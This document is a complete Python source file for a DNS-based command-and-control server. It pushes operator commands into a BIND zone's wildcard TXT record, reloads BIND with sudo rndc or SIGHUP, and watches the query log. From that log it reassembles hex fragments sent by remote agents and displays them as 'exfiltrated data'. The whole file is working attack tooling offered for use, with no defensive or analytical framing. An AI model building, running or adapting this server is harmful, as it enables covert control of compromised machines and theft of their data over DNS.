import os
import re
import time
import subprocess
import threading
import sys
from datetime import datetime
from typing import Dict, Optional, Tuple, Set, List
from pathlib import Path
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
class Console:
    CLEAR_LINE = '\033[2K'
    CURSOR_START = '\033[G'
    
    def __init__(self, base_domain: str):
        self.base_domain = base_domain
        self._print_lock = threading.Lock()
        self._prompt_active = False
    
    def _safe_print(self, msg: str) -> None:
        with self._print_lock:
            if self._prompt_active:
                sys.stdout.write(f"{self.CURSOR_START}{self.CLEAR_LINE}")
                print(msg)
                sys.stdout.write(f"{Colors.CYAN}{self.base_domain}>{Colors.RESET} ")
                sys.stdout.flush()
            else:
                print(msg)
                sys.stdout.flush()
    
    def info(self, msg: str) -> None:
        self._safe_print(f"{Colors.BLUE}[i]{Colors.RESET} {msg}")
    
    def success(self, msg: str) -> None:
        self._safe_print(f"{Colors.GREEN}[+]{Colors.RESET} {msg}")
    
    def warning(self, msg: str) -> None:
        self._safe_print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")
    
    def error(self, msg: str) -> None:
        self._safe_print(f"{Colors.RED}[-]{Colors.RESET} {msg}")
    
    def data(self, msg: str) -> None:
        self._safe_print(f"{Colors.MAGENTA}[D]{Colors.RESET} {msg}")
    
    def command(self, msg: str) -> None:
        self._safe_print(f"{Colors.CYAN}[>]{Colors.RESET} {msg}")
    
    def fragment(self, msg: str) -> None:
        self._safe_print(f"{Colors.GRAY}[.]{Colors.RESET} {msg}")
    
    def print(self, msg: str) -> None:
        self._safe_print(msg)
    
    def banner(self) -> None:
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
    ██████╗ ███╗   ██╗███████╗     ██████╗██████╗ 
    ██╔══██╗████╗  ██║██╔════╝    ██╔════╝╚════██╗
    ██║  ██║██╔██╗ ██║███████╗    ██║      █████╔╝
    ██║  ██║██║╚██╗██║╚════██║    ██║     ██╔═══╝ 
    ██████╔╝██║ ╚████║███████║    ╚██████╗███████╗
    ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═════╝╚══════╝
{Colors.RESET}
{Colors.GRAY}                                     {Colors.RESET}
{Colors.GRAY}    ─────────────────────────────────{Colors.RESET}
"""
        print(banner)
    
    def show_prompt(self) -> None:
        with self._print_lock:
            self._prompt_active = True
            sys.stdout.write(f"\n{Colors.CYAN}{self.base_domain}>{Colors.RESET} ")
            sys.stdout.flush()
    
    def clear_prompt(self) -> None:
        with self._print_lock:
            self._prompt_active = False
    
    def clear_screen(self) -> None:
        os.system('clear' if os.name == 'posix' else 'cls')

class DNSConfig:
    def __init__(self, log_file: str, zone_file: str, base_domain: str, 
                 command_subdomain: str = "cmd", data_subdomain: str = "data"):
        self.log_file = Path(log_file)
        self.zone_file = Path(zone_file)
        self.base_domain = base_domain
        self.command_subdomain = command_subdomain
        self.data_subdomain = data_subdomain
        self.data_regex = self._build_regex()
    
    def _build_regex(self) -> re.Pattern:
        pattern = (
            r".*query: (?P<sequence>\d+)-(?P<total>\d+)-(?P<cmdid>\d+)-"
            r"(?P<fragment>[a-f0-9]+)\.(?P<session>[a-zA-Z0-9]+)\." + 
            re.escape(self.data_subdomain) + r"\." + re.escape(self.base_domain)
        )
        return re.compile(pattern, re.IGNORECASE)

class DNSZoneManager:
    def __init__(self, config: DNSConfig, console: Console):
        self.config = config
        self.console = console
    
    def load_zone(self) -> Optional[List[str]]:
        try:
            with open(self.config.zone_file, 'r') as f:
                return f.readlines()
        except FileNotFoundError:
            self.console.error(f"Zone file not found at {self.config.zone_file}")
            return None
        except Exception as e:
            self.console.error(f"Error reading zone file: {e}")
            return None
    
    def write_zone(self, lines: List[str]) -> bool:
        try:
            with open(self.config.zone_file, 'w') as f:
                f.writelines(lines)
            return True
        except Exception as e:
            self.console.error(f"Error writing to zone file: {e}")
            return False
    
    def update_zone(self, command_str: str) -> bool:
        lines = self.load_zone()
        if not lines:
            return False
        
        new_lines = []
        serial_updated = False
        command_updated = False
        
        for line in lines:
            if 'Serial' in line and not serial_updated:
                line = self._update_serial(line)
                serial_updated = True if line else False
            
            if (f'*.{self.config.command_subdomain} IN TXT' in line or 
                f'{self.config.command_subdomain} IN TXT' in line):
                line = f'*.{self.config.command_subdomain} IN TXT "{command_str}"\n'
                command_updated = True
            
            new_lines.append(line)
        
        if self.write_zone(new_lines):
            if not serial_updated or not command_updated:
                self.console.warning("Could not update SOA serial or command TXT record correctly.")
            return True
        return False
    
    def _update_serial(self, line: str) -> str:
        serial_match = re.search(r'(\d+)\s+;\s+Serial', line)
        if not serial_match:
            return line
        
        current_serial = int(serial_match.group(1))
        date_part = datetime.now().strftime("%Y%m%d")
        
        if str(current_serial).startswith(date_part):
            new_serial = current_serial + 1
        else:
            new_serial = int(date_part + "01")
        
        return re.sub(r'(\d+)\s+;\s+Serial', f'{new_serial}       ; Serial', line, count=1)
    
    def reload_bind(self) -> bool:
        self.console.info("Attempting to reload BIND service...")
        
        if self._reload_via_rndc():
            return True
        
        self.console.warning("Falling back to SIGHUP (requires running as root or privileged user).")
        return self._reload_via_sighup()
    
    def _reload_via_rndc(self) -> bool:
        try:
            result = subprocess.run(
                ['sudo', 'rndc', 'reload', self.config.base_domain],
                capture_output=True, text=True, check=True, timeout=10
            )
            self.console.success(f"BIND reload successful: {result.stdout.strip()}")
            return True
        except subprocess.CalledProcessError as e:
            self.console.error("Error reloading BIND via rndc. Check rndc configuration and permissions.")
            self.console.error(f"Stderr: {e.stderr.strip()}")
            return False
        except FileNotFoundError:
            self.console.error("'rndc' command not found. Please install BIND utilities.")
            return False
        except subprocess.TimeoutExpired:
            self.console.error("BIND reload timed out.")
            return False
    
    def _reload_via_sighup(self) -> bool:
        try:
            pid = subprocess.check_output(['pgrep', 'named']).decode().strip()
            subprocess.run(['sudo', 'kill', '-HUP', pid], check=True, timeout=5)
            self.console.success("Successfully sent SIGHUP to 'named' process.")
            return True
        except Exception as e:
            self.console.error(f"Error sending SIGHUP or finding 'named' PID: {e}")
            self.console.error("Manual intervention required: Reload BIND service manually.")
            return False

class DataDecoder:
    @staticmethod
    def decode_fragment(encoded_fragment: str) -> Tuple[str, str]:
        try:
            decoded = bytes.fromhex(encoded_fragment).decode('utf-8', errors='ignore')
            return encoded_fragment, decoded
        except Exception as e:
            return encoded_fragment, f"[DecodingError-Raw:{encoded_fragment}] - {e}"

class CommandOutputManager:
    def __init__(self, output_dir: str, console: Console):
        self.output_dir = Path(output_dir)
        self.console = console
        self._saved_commands: Set[str] = set()
    
    def save_output(self, cmd_id: str, session_id: str, decoded_output: str, 
                   silent: bool = False) -> Optional[Path]:
        save_key = f"{cmd_id}-{session_id}"
        
        if save_key in self._saved_commands:
            if not silent:
                self.console.warning(f"Command {cmd_id} (session: {session_id}) already saved - SKIPPED")
            return None
        
        self.output_dir.mkdir(parents=True, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = self.output_dir / f"cmd_{cmd_id}_{session_id}_{timestamp}.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write(f"Command ID: {cmd_id}\n")
                f.write(f"Session: {session_id}\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                f.write(f"{'='*50}\n")
                f.write(decoded_output)
            
            self._saved_commands.add(save_key)
            
            if not silent:
                self.console.success(f"Output saved to: {Colors.BOLD}{filename}{Colors.RESET}")
            return filename
        except Exception as e:
            self.console.error(f"Error saving output: {e}")
            return None

class SessionData:
    def __init__(self, cmd_id: str, session_id: str, total: int):
        self.cmd_id = cmd_id
        self.session_id = session_id
        self.total = total
        self.fragments: Dict[int, str] = {}
    
    def add_fragment(self, sequence: int, fragment: str) -> None:
        self.fragments[sequence] = fragment
    
    def is_complete(self) -> bool:
        return len(self.fragments) == self.total
    
    def get_assembled_data(self) -> str:
        sorted_fragments = sorted(self.fragments.items())
        return "".join(f for seq, f in sorted_fragments)
    
    @property
    def received_count(self) -> int:
        return len(self.fragments)

class DataProcessor:
    def __init__(self, config: DNSConfig, console: Console, output_manager: CommandOutputManager):
        self.config = config
        self.console = console
        self.output_manager = output_manager
        self._sessions: Dict[str, SessionData] = {}
        self._received_fragments: Set[str] = set()
    
    def process_log_line(self, line: str, silent: bool = False) -> bool:
        match = self.config.data_regex.search(line)
        if not match:
            return False
        
        fragment = match.group('fragment')
        sequence = int(match.group('sequence'))
        total = int(match.group('total'))
        cmd_id = match.group('cmdid')
        session_id = match.group('session')
        
        unique_key = f"{cmd_id}-{session_id}-{sequence}"
        
        if unique_key in self._received_fragments:
            return False
        
        self._received_fragments.add(unique_key)
        
        data_key = f"cmd{cmd_id}_{session_id}"
        
        if data_key not in self._sessions:
            self._sessions[data_key] = SessionData(cmd_id, session_id, total)
        
        session = self._sessions[data_key]
        session.add_fragment(sequence, fragment)
        
        if not silent:
            self.console.fragment(
                f"Fragment {Colors.CYAN}{sequence}/{total}{Colors.RESET} for cmd "
                f"{Colors.YELLOW}{cmd_id}{Colors.RESET} (session: {session_id}) "
                f"[{Colors.GREEN}{session.received_count}/{total}{Colors.RESET}]"
            )
        
        if session.is_complete():
            self._handle_complete_session(session, silent)
        
        return True
    
    def _handle_complete_session(self, session: SessionData, silent: bool) -> None:
        if not silent:
            self.console.success(
                f"Command {Colors.BOLD}{session.cmd_id}{Colors.RESET} COMPLETE! "
                f"All {session.total} fragments received."
            )
        
        full_hex = session.get_assembled_data()
        _, decoded = DataDecoder.decode_fragment(full_hex)
        
        self.output_manager.save_output(session.cmd_id, session.session_id, decoded, silent=silent)
        
        if not silent:
            self.console.print(f"\n{Colors.MAGENTA}{'─'*50}{Colors.RESET}")
            self.console.print(f"{Colors.MAGENTA}{Colors.BOLD}EXFILTRATED DATA:{Colors.RESET}")
            self.console.print(f"{Colors.WHITE}{decoded}{Colors.RESET}")
            self.console.print(f"{Colors.MAGENTA}{'─'*50}{Colors.RESET}\n")
    
    def get_all_sessions(self) -> Dict[str, SessionData]:
        return self._sessions
    
    def get_max_command_id(self) -> int:
        max_id = 0
        for session in self._sessions.values():
            cmd_id = int(session.cmd_id)
            if cmd_id > max_id:
                max_id = cmd_id
        return max_id

class LogMonitor:
    def __init__(self, log_file: Path, data_processor: DataProcessor, console: Console):
        self.log_file = log_file
        self.data_processor = data_processor
        self.console = console
        self._running = False
        self._thread: Optional[threading.Thread] = None
    
    def start(self) -> bool:
        try:
            log_handle = open(self.log_file, 'r')
        except Exception as e:
            self.console.error(f"Error opening log file: {e}")
            return False
        
        self._running = True
        self._thread = threading.Thread(
            target=self._monitor_loop, 
            args=(log_handle,), 
            daemon=True
        )
        self._thread.start()
        return True
    
    def stop(self) -> None:
        self._running = False
    
    def _monitor_loop(self, log_file) -> None:
        while self._running:
            try:
                line = log_file.readline()
                if line:
                    self.data_processor.process_log_line(line)
                else:
                    time.sleep(0.1)
            except Exception as e:
                if self._running:
                    self.console.error(f"Error in log monitor: {e}")
                break
        
        log_file.close()

class CommandDeployer:
    def __init__(self, zone_manager: DNSZoneManager, console: Console):
        self.zone_manager = zone_manager
        self.console = console
        self._command_counter = 1
    
    def deploy(self, raw_command: str) -> bool:
        command_str = f"CMD:{self._command_counter}:{raw_command}"
        
        self.console.print(f"\n{Colors.YELLOW}{'-'*50}{Colors.RESET}")
        self.console.command(f"Deploying: {Colors.BOLD}{raw_command}{Colors.RESET}")
        self.console.info(f"Command ID: {Colors.YELLOW}{self._command_counter}{Colors.RESET}")
        
        if self.zone_manager.update_zone(command_str):
            if self.zone_manager.reload_bind():
                self.console.success("Command deployed successfully!")
                self._command_counter += 1
                self.console.print(f"{Colors.YELLOW}{'-'*50}{Colors.RESET}\n")
                return True
        
        self.console.error("Failed to deploy command. Check file paths and permissions.")
        return False
    
    def set_counter(self, value: int) -> None:
        self._command_counter = value
    
    @property
    def current_counter(self) -> int:
        return self._command_counter

class CLI:
    def __init__(self, config: DNSConfig):
        self.config = config
        self.console = Console(config.base_domain)
        self.zone_manager = DNSZoneManager(config, self.console)
        self.output_manager = CommandOutputManager("./commands", self.console)
        self.data_processor = DataProcessor(config, self.console, self.output_manager)
        self.command_deployer = CommandDeployer(self.zone_manager, self.console)
        self.log_monitor = LogMonitor(config.log_file, self.data_processor, self.console)
    
    def run(self) -> None:
        self.console.banner()
        
        if not self._initialize_from_logs():
            return
        
        if not self.log_monitor.start():
            return
        
        self._main_loop()
    
    def _initialize_from_logs(self) -> bool:
        self.console.info(f"Processing existing logs from {Colors.CYAN}{self.config.log_file}{Colors.RESET}...")
        
        try:
            with open(self.config.log_file, 'r') as f:
                line_count = 0
                fragment_count = 0
                
                for line in f:
                    line_count += 1
                    if self.data_processor.process_log_line(line, silent=True):
                        fragment_count += 1
        except Exception as e:
            self.console.error(f"Error processing log file: {e}")
            return False
        
        max_cmd_id = self.data_processor.get_max_command_id()
        if max_cmd_id > 0:
            self.command_deployer.set_counter(max_cmd_id + 1)
        
        self.console.success(
            f"Processed {Colors.BOLD}{line_count}{Colors.RESET} log lines, "
            f"found {Colors.BOLD}{fragment_count}{Colors.RESET} data fragments"
        )
        self.console.success(
            f"Recovered {Colors.BOLD}{len(self.data_processor.get_all_sessions())}{Colors.RESET} command session(s)"
        )
        self.console.info(f"Next command ID: {Colors.YELLOW}{self.command_deployer.current_counter}{Colors.RESET}")
        
        self._show_session_summary()
        
        self.console.print(f"\n{Colors.GRAY}{'='*60}{Colors.RESET}")
        self.console.success("C2 CLI ready. Monitoring logs in real-time...")
        self.console.info(f"Type {Colors.YELLOW}help{Colors.RESET} for available commands")
        self.console.print(f"{Colors.GRAY}{'='*60}{Colors.RESET}")
        
        return True
    
    def _show_session_summary(self) -> None:
        sessions = self.data_processor.get_all_sessions()
        complete = sum(1 for s in sessions.values() if s.is_complete())
        incomplete = len(sessions) - complete
        
        if complete > 0 or incomplete > 0:
            self.console.data(
                f"Complete: {Colors.GREEN}{complete}{Colors.RESET}, "
                f"Incomplete: {Colors.YELLOW}{incomplete}{Colors.RESET}"
            )
    
    def _main_loop(self) -> None:
        try:
            while True:
                self.console.show_prompt()
                
                try:
                    user_input = input().strip()
                except EOFError:
                    break
                finally:
                    self.console.clear_prompt()
                
                if not user_input:
                    continue
                
                if not self._handle_command(user_input):
                    break
        
        except KeyboardInterrupt:
            self.console.print("")
            self.console.info("Interrupted. Exiting...")
        finally:
            self.log_monitor.stop()
    
    def _handle_command(self, user_input: str) -> bool:
        cmd_lower = user_input.lower()
        
        if cmd_lower in ('exit', 'quit'):
            self.console.info("Exiting C2 CLI. Goodbye!")
            return False
        
        elif cmd_lower == 'show':
            self._show_exfiltrated_data()
        
        elif cmd_lower == 'help':
            self._show_help()
        
        elif cmd_lower == 'status':
            self._show_status()
        
        elif cmd_lower == 'clear':
            self.console.clear_screen()
            self.console.banner()
        
        elif user_input.upper().startswith("CMD:"):
            raw_command = user_input[4:].strip()
            if raw_command:
                self.command_deployer.deploy(raw_command)
            else:
                self.console.warning("No command specified. Usage: CMD:<command>")
        
        else:
            self.console.warning(f"Unknown command: {user_input}")
            self.console.info(f"Type {Colors.YELLOW}help{Colors.RESET} for available commands")
        
        return True
    
    def _show_exfiltrated_data(self) -> None:
        self.console.print(f"\n{Colors.MAGENTA}{'='*60}{Colors.RESET}")
        self.console.print(f"{Colors.MAGENTA}{Colors.BOLD}  EXFILTRATED DATA STATUS{Colors.RESET}")
        self.console.print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}")
        
        sessions = self.data_processor.get_all_sessions()
        
        if not sessions:
            self.console.warning("No data fragments received yet.")
        else:
            for session in sessions.values():
                if not session.fragments:
                    continue
                
                full_hex = session.get_assembled_data()
                _, decoded = DataDecoder.decode_fragment(full_hex)
                
                status_color = Colors.GREEN if session.is_complete() else Colors.YELLOW
                status_text = "COMPLETE" if session.is_complete() else f"INCOMPLETE ({session.received_count}/{session.total})"
                
                self.console.print(f"\n{Colors.CYAN}+-- Command {Colors.BOLD}{session.cmd_id}{Colors.RESET}")
                self.console.print(f"{Colors.CYAN}|{Colors.RESET} Session: {Colors.GRAY}{session.session_id}{Colors.RESET}")
                self.console.print(f"{Colors.CYAN}|{Colors.RESET} Status: {status_color}{status_text}{Colors.RESET}")
                self.console.print(f"{Colors.CYAN}|{Colors.RESET} Fragments: {session.received_count}/{session.total}")
                self.console.print(f"{Colors.CYAN}|{Colors.RESET}")
                self.console.print(f"{Colors.CYAN}|{Colors.RESET} {Colors.DIM}Raw Hex (first 80 chars):{Colors.RESET}")
                self.console.print(f"{Colors.CYAN}|{Colors.RESET} {Colors.GRAY}{full_hex[:80]}...{Colors.RESET}")
                self.console.print(f"{Colors.CYAN}|{Colors.RESET}")
                self.console.print(f"{Colors.CYAN}+-- {Colors.BOLD}Decoded Output:{Colors.RESET}")
                
                for line in decoded.split('\n'):
                    self.console.print(f"    {Colors.WHITE}{line}{Colors.RESET}")
        
        self.console.print(f"\n{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")
    
    def _show_help(self) -> None:
        self.console.print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        self.console.print(f"{Colors.CYAN}{Colors.BOLD}  AVAILABLE COMMANDS{Colors.RESET}")
        self.console.print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
        self.console.print(f"  {Colors.YELLOW}CMD:<command>{Colors.RESET}  - Deploy a command to agents")
        self.console.print(f"  {Colors.YELLOW}show{Colors.RESET}          - Show exfiltrated data")
        self.console.print(f"  {Colors.YELLOW}status{Colors.RESET}        - Show current status summary")
        self.console.print(f"  {Colors.YELLOW}clear{Colors.RESET}         - Clear the screen")
        self.console.print(f"  {Colors.YELLOW}help{Colors.RESET}          - Show this help message")
        self.console.print(f"  {Colors.YELLOW}exit{Colors.RESET}          - Exit the CLI")
        self.console.print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
    
    def _show_status(self) -> None:
        sessions = self.data_processor.get_all_sessions()
        complete = sum(1 for s in sessions.values() if s.is_complete())
        incomplete = len(sessions) - complete
        total_fragments = sum(s.received_count for s in sessions.values())
        
        self.console.print(f"\n{Colors.CYAN}{'='*40}{Colors.RESET}")
        self.console.print(f"{Colors.CYAN}{Colors.BOLD}  STATUS{Colors.RESET}")
        self.console.print(f"{Colors.CYAN}{'='*40}{Colors.RESET}")
        self.console.print(f"  Next Command ID: {Colors.YELLOW}{self.command_deployer.current_counter}{Colors.RESET}")
        self.console.print(f"  Total Sessions:  {Colors.BOLD}{len(sessions)}{Colors.RESET}")
        self.console.print(f"  Complete:        {Colors.GREEN}{complete}{Colors.RESET}")
        self.console.print(f"  Incomplete:      {Colors.YELLOW}{incomplete}{Colors.RESET}")
        self.console.print(f"  Total Fragments: {Colors.BOLD}{total_fragments}{Colors.RESET}")
        self.console.print(f"{Colors.CYAN}{'='*40}{Colors.RESET}\n")

def main():
    config = DNSConfig(
        log_file="/var/log/named/bind.log",
        zone_file="/etc/bind/zones/domain.com.zone",
        base_domain="domain.com",
        command_subdomain="cmd",
        data_subdomain="data"
    )
    
    cli = CLI(config)
    cli.run()

if __name__ == "__main__":
    main()